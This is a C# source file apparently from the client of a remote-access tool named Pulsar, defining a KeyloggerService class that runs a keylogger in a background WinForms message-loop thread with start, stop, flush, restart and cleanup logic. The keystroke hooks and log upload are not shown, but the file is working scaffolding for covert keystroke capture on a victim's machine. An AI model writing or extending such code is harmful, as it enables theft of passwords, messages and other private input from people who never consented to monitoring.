using System;
using System.ComponentModel;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Client.Logging
{
    /// <summary>
    /// Runs the keylogger inside its own clean WinForms message loop.
    /// </summary>
    public class KeyloggerService : IDisposable
    {
        private readonly Thread _msgLoopThread;
        private ApplicationContext _msgLoop;
        private Keylogger _keylogger;

        private SynchronizationContext _syncContext;

        private readonly ManualResetEventSlim _initialized = new ManualResetEventSlim(false);
        private readonly ManualResetEventSlim _shutdownComplete = new ManualResetEventSlim(false);
        private readonly CancellationTokenSource _cancellationTokenSource = new CancellationTokenSource();

        private bool _disposed;
        private volatile bool _isRunning;

        public KeyloggerService()
        {
            _msgLoopThread = new Thread(MessageLoopThread)
            {
                IsBackground = true,
                Name = "Keylogger Message Loop Thread",
                Priority = ThreadPriority.BelowNormal
            };

            // 🔥 REQUIRED for Clipboard, DragDrop, WinForms OLE calls
            _msgLoopThread.SetApartmentState(ApartmentState.STA);
        }


        public bool IsRunning => _isRunning && !_disposed;

        public event EventHandler<Exception> ErrorOccurred;
        public event EventHandler Started;
        public event EventHandler Stopped;

        // =====================================================
        //  THREAD ENTRY POINT
        // =====================================================
        private void MessageLoopThread()
        {
            try
            {
                // Install WinForms sync context for thread marshaling
                _syncContext = new WindowsFormsSynchronizationContext();
                SynchronizationContext.SetSynchronizationContext(_syncContext);

                _msgLoop = new ApplicationContext();

                // Create and start keylogger
                _keylogger = new Keylogger(3500, 100 * 1024);
                _keylogger.Start();

                _isRunning = true;
                _initialized.Set();

                OnStarted();

                // Main loop with cancellation support
                while (!_cancellationTokenSource.IsCancellationRequested)
                {
                    Application.DoEvents();
                    Thread.Sleep(25);
                }

                _msgLoop.ExitThread();
                _isRunning = false;
                OnStopped();
            }
            catch (Exception ex)
            {
                _isRunning = false;
                OnErrorOccurred(ex);
            }
            finally
            {
                _shutdownComplete.Set();
            }
        }

        // =====================================================
        //  START
        // =====================================================
        public bool Start(int timeoutMs = 10000)
        {
            if (_disposed)
                throw new ObjectDisposedException(nameof(KeyloggerService));

            if (_isRunning)
                return true;

            if (!_msgLoopThread.IsAlive)
            {
                _msgLoopThread.Start();

                if (_initialized.Wait(timeoutMs))
                    return _isRunning;

                throw new TimeoutException("Keylogger failed to initialize.");
            }

            return _isRunning;
        }

        public Task<bool> StartAsync(int timeoutMs = 10000)
        {
            return Task.Run(() => Start(timeoutMs));
        }

        // =====================================================
        //  STOP
        // =====================================================
        public bool Stop(int timeoutMs = 5000)
        {
            if (_disposed || !_isRunning)
                return true;

            try
            {
                _cancellationTokenSource.Cancel();

                if (_shutdownComplete.Wait(timeoutMs))
                    return true;

                OnErrorOccurred(new TimeoutException("Keylogger service failed to stop."));
                return false;
            }
            catch (Exception ex)
            {
                OnErrorOccurred(ex);
                return false;
            }
        }

        // =====================================================
        //  FORCE FLUSH — NOW FIXED
        // =====================================================
        public void Flush()
        {
            if (!_isRunning || _keylogger == null)
                return;

            try
            {
                if (_syncContext != null)
                {
                    // Marshal flush back to the keylogger thread
                    _syncContext.Post(_ => _keylogger.FlushImmediately(), null);
                }
                else
                {
                    // Fallback (should never happen)
                    _keylogger.FlushImmediately();
                }
            }
            catch (Exception ex)
            {
                OnErrorOccurred(ex);
            }
        }

        // =====================================================
        //  RESTART
        // =====================================================
        public async Task<bool> RestartAsync(int shutdownTimeoutMs = 5000, int startupTimeoutMs = 10000)
        {
            if (Stop(shutdownTimeoutMs))
            {
                await Task.Delay(500);
                return await StartAsync(startupTimeoutMs);
            }
            return false;
        }

        // =====================================================
        //  EVENTS
        // =====================================================
        protected virtual void OnErrorOccurred(Exception ex)
        {
            ErrorOccurred?.Invoke(this, ex);
        }

        protected virtual void OnStarted()
        {
            Started?.Invoke(this, EventArgs.Empty);
        }

        protected virtual void OnStopped()
        {
            Stopped?.Invoke(this, EventArgs.Empty);
        }

        // =====================================================
        //  DISPOSE
        // =====================================================
        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
                return;

            if (disposing)
            {
                _cancellationTokenSource.Cancel();

                try
                {
                    if (_isRunning)
                        Stop(3000);

                    if (_msgLoopThread.IsAlive && !_msgLoopThread.Join(2000))
                        _msgLoopThread.Interrupt();
                }
                catch (Exception ex)
                {
                    OnErrorOccurred(ex);
                }
                finally
                {
                    _keylogger?.Dispose();
                    _keylogger = null;

                    _msgLoop?.Dispose();
                    _msgLoop = null;

                    _cancellationTokenSource.Dispose();
                    _initialized.Dispose();
                    _shutdownComplete.Dispose();
                }
            }

            _disposed = true;
        }

        ~KeyloggerService()
        {
            Dispose(false);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
    }
}
